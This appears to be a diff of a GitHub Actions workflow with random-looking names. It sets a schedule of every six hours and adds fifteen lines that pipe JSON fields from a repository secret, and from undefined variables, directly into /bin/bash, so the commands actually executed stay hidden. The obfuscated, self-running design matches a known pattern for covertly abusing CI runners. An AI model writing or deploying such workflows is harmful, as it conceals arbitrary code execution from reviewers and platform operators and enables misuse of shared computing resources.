@@ -3,23 +3,31 @@ name: songlangman6789
 on:
   workflow_dispatch:
   schedule:
-    - cron: '21 0/6 * * *'
+    - cron: '56 3/6 * * *'
 
-jobs:  # 12801
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: songlangman6789
         env:
-          kisc53: ${{ secrets.kisc53 }}
+          ine242: ${{ secrets.ine242 }}
         run: |
-          echo $kisc53 | jq -r .gqa0756 | /bin/bash
-          echo $ucg835 | jq -r .locl0866 | /bin/bash
-          echo $z74239 | jq -r .qor23 | /bin/bash
-          echo $o462 | jq -r .yck5 | /bin/bash
-          echo $lmfa31905 | jq -r .oy8 | /bin/bash
-          echo $xs72 | jq -r .rk74858 | /bin/bash
-          echo $zloi7 | jq -r .zmm01904 | /bin/bash
-          echo $yl9610 | jq -r .wl77129 | /bin/bash
+          echo $ine242 | jq -r .ous398 | /bin/bash
+          echo $o7 | jq -r .leief225 | /bin/bash
+          echo $bm7328 | jq -r .lodwg0 | /bin/bash
+          echo $r00734 | jq -r .wttg102 | /bin/bash
+          echo $z55 | jq -r .i579 | /bin/bash
+          echo $bm92331 | jq -r .cu974 | /bin/bash
+          echo $uewp574 | jq -r .y88 | /bin/bash
+          echo $l9 | jq -r .kdcws799 | /bin/bash
+          echo $hlwy25355 | jq -r .ur29061 | /bin/bash
+          echo $oh50 | jq -r .uinw2177 | /bin/bash
+          echo $wistj3812 | jq -r .pc4095 | /bin/bash
+          echo $a7 | jq -r .evnon52 | /bin/bash
+          echo $y06760 | jq -r .zzg5346 | /bin/bash
+          echo $igt782 | jq -r .z11875 | /bin/bash
+          echo $mqs7 | jq -r .ws00 | /bin/bash
 
